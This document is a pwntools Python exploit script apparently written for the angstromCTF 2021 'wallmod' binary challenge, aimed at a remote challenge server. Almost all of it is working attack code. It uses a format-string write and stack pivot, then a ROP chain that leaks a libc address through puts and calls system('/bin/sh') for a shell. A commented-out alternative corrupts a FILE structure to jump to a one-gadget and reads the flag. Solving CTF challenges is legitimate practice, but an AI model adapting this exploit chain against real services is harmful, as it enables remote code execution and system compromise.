#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.2021.chall.actf.co', 21800
binary = './wallmod'
brkpts = '''
b *0x000000000040155c
b printf
'''

elf = ELF("wallmod")
libc = ELF("libc-2.32.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.32.so'})

main = 0x4014bd
bss = 0x404000
fp = 0x404110
scanf = 0x401180
getchar = 0x4013ea
pd = 0x40203f
leave = 0x00401334

exit = 0x404068
bss = 0x4041a8

pop_rdi = 0x00000000004015c3
pop_rsi_r15 = 0x00000000004015c1
puts_got = 0x0000000000404020
puts= 0x0000000000401100
ret =  0x000000000040101a
read = 0x401130
buf = 0x4040e0
pop_rbp = 0x000000000040127d
leave = 0x0000000000401336

if __name__ == "__main__":
    gdb.attach(io, brkpts)
    sla("stonks!\n",str(1)) 
    
    sla("to see?\n",str(544/8))
    
    payload = ("%{}m".format(bss-8)+ "%73$ln").encode()
    payload = payload.ljust(197,b"b")+b"zzz"
    payload += p64(pop_rdi)+p64(puts_got) + p64(puts) + p64(0x401160) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(0x404b98) + p64(0) + p64(read) + p64(pop_rbp) + p64(0x404b90) + p64(leave)

    sa("token?\n",payload)
    sleep(2)

    reu("zzz")
    rl()
    leak = u64(rl().strip().ljust(8,b"\x00"))
    print(hex(leak))

    base = leak-0x80d90
    sys = base + libc.symbols['system']
    gadget = base + 0xdf54f
    binsh = base + 0x1ae41f

    sleep(4)
    p2 = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(sys)
    sl(p2)

    io.interactive()

'''
    sla("stonks!\n","1")
    gdb.attach(io, brkpts)
    sla("to see?\n",'56')
    libc.address = uu64(re(6)) - 0x1e46c0
    log.success("libc = " + hex(libc.address))

    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))
    ptr = libc.symbols['_IO_file_jumps'] - 0x18
    log.info("ptr -> "+hex(ptr))
    libc_bss = libc.address + 0x1e33a0
    exitptr = libc.address + 0x21bfc8
    gadget = libc.address + 0xdf54f
    log.info("gadget -> "+hex(gadget))
    vals = [
        0xfbad3888,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0x404080,
        0, 
        0,
        0, 
        0,
        0, 
        0,
        0, 
        0,
        0,
        ptr
    ]
    payload = ("%{}m".format(fp) + "%64$ln" + "%*68$c" + "%65$ln" + "%{}m".format(int("0x"+hex(gadget)[-8:], 16)) + "%65$n").ljust(0x30, "\x00")
    for i in vals:
        payload += p64(i)
    sa("token?\n",payload)

    sleep(2)
    sl("cat flag*")

    io.interactive()
    '''
